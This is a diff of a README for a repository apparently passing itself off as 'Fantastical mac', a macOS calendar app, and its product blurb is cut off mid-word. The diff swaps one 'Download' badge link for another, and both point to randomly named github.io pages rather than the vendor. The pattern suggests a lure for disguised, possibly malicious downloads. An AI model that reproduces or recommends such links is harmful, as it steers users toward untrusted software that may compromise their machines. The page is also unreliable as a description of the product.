@@ -2,7 +2,7 @@
 
 Fantastical mac on macOS — toolkit for natural language input, calendar sets & focus modes, and openings/meeting proposals with native integrations fo
 
-[![Download Fantastical mac](https://img.shields.io/badge/Download-Fantastical_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Fantastical mac](https://img.shields.io/badge/Download-Fantastical_mac-blueviolet)](https://mleczkonovkotson.github.io/.github/Fantastical-Studio)
 
 ---
 
